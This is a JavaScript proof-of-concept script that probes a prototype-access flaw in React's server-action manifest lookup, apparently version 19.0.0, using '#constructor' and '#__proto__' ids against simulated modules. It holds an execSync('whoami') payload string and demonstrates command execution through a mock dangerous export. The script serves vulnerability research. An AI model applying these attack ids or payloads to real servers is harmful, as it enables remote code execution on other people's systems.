/**
 * Testing the manifest lookup attack vector
 *
 * The code does:
 *   var idx = id.lastIndexOf("#");
 *   name = id.slice(idx + 1);
 *   resolvedModuleData = bundlerConfig[id.slice(0, idx)];
 *
 * So if we send id="validModule#constructor", it will:
 * 1. Look up bundlerConfig["validModule"]
 * 2. Set name to "constructor"
 * 3. Later: moduleExports["constructor"] - prototype access!
 */

console.log("=== Manifest Lookup Attack Test ===\n");

// Simulate the manifest (bundlerConfig)
const bundlerConfig = {
  // A legitimate server action module
  "abc123def456": {
    id: "server-actions-chunk-12345",
    chunks: ["server-actions-chunk-12345"],
    name: "myServerAction"
  },
  // This is what a real Next.js manifest entry looks like
  "d4e5f6a7b8c9": {
    id: "app/actions.js",
    chunks: [],
    name: "submitForm"
  }
};

// Simulate __webpack_require__
const webpackModules = {
  "server-actions-chunk-12345": {
    myServerAction: async (data) => ({ success: true, data }),
    otherAction: async () => "other"
  },
  "app/actions.js": {
    submitForm: async (formData) => ({ submitted: true }),
    default: { name: "ActionsModule" }
  }
};

function __webpack_require__(id) {
  return webpackModules[id];
}

// Simulate resolveServerReference
function resolveServerReference(bundlerConfig, id) {
  var name = "",
    resolvedModuleData = bundlerConfig[id];
  if (resolvedModuleData) {
    name = resolvedModuleData.name;
  } else {
    var idx = id.lastIndexOf("#");
    if (idx !== -1) {
      name = id.slice(idx + 1);  // ATTACKER CONTROLS THIS!
      resolvedModuleData = bundlerConfig[id.slice(0, idx)];
    }
    if (!resolvedModuleData) {
      throw Error('Could not find module "' + id + '" in manifest');
    }
  }
  return [resolvedModuleData.id, resolvedModuleData.chunks, name];
}

// Simulate requireModule (VULNERABLE in 19.0.0)
function requireModule(metadata) {
  var moduleExports = __webpack_require__(metadata[0]);
  return "*" === metadata[2]
    ? moduleExports
    : "" === metadata[2]
      ? moduleExports.__esModule
        ? moduleExports.default
        : moduleExports
      : moduleExports[metadata[2]];  // VULNERABLE LINE!
}

console.log("=== Test 1: Normal action call ===");
try {
  const ref = resolveServerReference(bundlerConfig, "abc123def456");
  console.log("Reference:", ref);
  const fn = requireModule(ref);
  console.log("Function:", fn);
  console.log("Type:", typeof fn);
} catch(e) {
  console.log("Error:", e.message);
}

console.log("\n=== Test 2: Attack with #constructor ===");
try {
  // Attack: Use a valid module ID + #constructor
  const attackId = "abc123def456#constructor";
  const ref = resolveServerReference(bundlerConfig, attackId);
  console.log("Reference:", ref);
  const result = requireModule(ref);
  console.log("Result:", result);
  console.log("Is Object constructor:", result === Object);
} catch(e) {
  console.log("Error:", e.message);
}

console.log("\n=== Test 3: Attack with #__proto__ ===");
try {
  const attackId = "abc123def456#__proto__";
  const ref = resolveServerReference(bundlerConfig, attackId);
  console.log("Reference:", ref);
  const result = requireModule(ref);
  console.log("Result:", result);
  console.log("Is Object.prototype:", result === Object.prototype);
} catch(e) {
  console.log("Error:", e.message);
}

console.log("\n=== Test 4: What can we do with Object constructor? ===");
const ObjectConstructor = Object;
console.log("ObjectConstructor:", ObjectConstructor);
console.log("ObjectConstructor.constructor:", ObjectConstructor.constructor);
console.log("Is Function:", ObjectConstructor.constructor === Function);

// Can we call bind on Object constructor?
console.log("\n=== Test 5: The actual call chain ===");
// In real exploit, the code does:
//   fn.bind.apply(fn, [null].concat(bound))
// where fn is what we get from requireModule

const fn = Object;  // What we get from moduleExports['constructor']
const bound = ["return process.mainModule.require('child_process').execSync('whoami').toString()"];

try {
  // This is what React does with the result
  const boundFn = fn.bind.apply(fn, [null].concat(bound));
  console.log("Bound function:", boundFn);

  // When the action is invoked:
  const result = boundFn();
  console.log("Result of calling bound Object:", result);
  console.log("Type:", typeof result);
  // Object("string") returns String object wrapper, not code execution!
} catch(e) {
  console.log("Error:", e.message);
}

console.log("\n=== KEY FINDING ===");
console.log(`
The attack via #constructor gives us [Function: Object]
But Object(args) doesn't execute code - it just wraps primitives!

We need TWO property accesses to get Function:
  moduleExports['constructor']['constructor'] = Function

With only ONE access:
  moduleExports['constructor'] = Object  (can't execute code)
  moduleExports['__proto__'] = Object.prototype (no direct functions)

UNLESS... we find a module whose exports include a dangerous function!
`);

console.log("\n=== Test 6: What if the server action module has dangerous exports? ===");
// What if a developer accidentally exports something dangerous?
const dangerousModule = {
  myAction: async () => "safe",
  // Developer might export these for internal use:
  runCode: eval,  // Very unlikely but possible
  exec: require('child_process').execSync,  // Also unlikely
  // More realistic: a helper that uses vm
  compile: require('vm').compileFunction,
};

webpackModules["dangerous-actions"] = dangerousModule;
bundlerConfig["dangerous123"] = {
  id: "dangerous-actions",
  chunks: [],
  name: "myAction"
};

// Now we can access the dangerous exports!
console.log("Attack on dangerous module:");
try {
  const ref = resolveServerReference(bundlerConfig, "dangerous123#exec");
  console.log("Reference:", ref);
  const fn = requireModule(ref);
  console.log("Got function:", fn);
  if (typeof fn === 'function') {
    const result = fn('whoami');
    console.log("RCE Result:", result.toString());
  }
} catch(e) {
  console.log("Error:", e.message);
}
